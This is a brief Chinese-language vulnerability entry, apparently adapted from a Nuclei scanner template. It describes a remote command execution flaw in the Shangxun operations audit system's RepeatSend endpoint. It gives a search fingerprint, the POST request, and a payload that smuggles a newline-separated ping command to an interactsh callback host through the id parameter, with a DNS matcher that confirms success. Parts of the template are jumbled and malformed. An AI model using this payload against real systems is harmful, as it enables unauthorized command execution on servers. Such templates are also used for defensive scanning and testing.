# 上讯信息运维管理审计系统repeatsend远程命令执行

- **系统**：上讯信息运维管理审计系统repeatsend　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="default/getloginhtml"`
- **请求**：`POST /emailapply/RepeatSend HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`id: shangxun-RepeatSend-rce`　`name: shangxun-RepeatSend-rce`　`author: Aa`　`severity: high`

**请求体 / payload**
```
id='%0aping {{interactsh-url}}%0a'
- raw:
-
Content-Type: application/x-www-form-urlencoded
id='%0aping {{interactsh-url}}%0a'
matchers:
- type: word
part: interactsh_protocol # Confirms the DNS Interaction
words:
- "dns"
```
- **预期**：200　|　DNSlog回显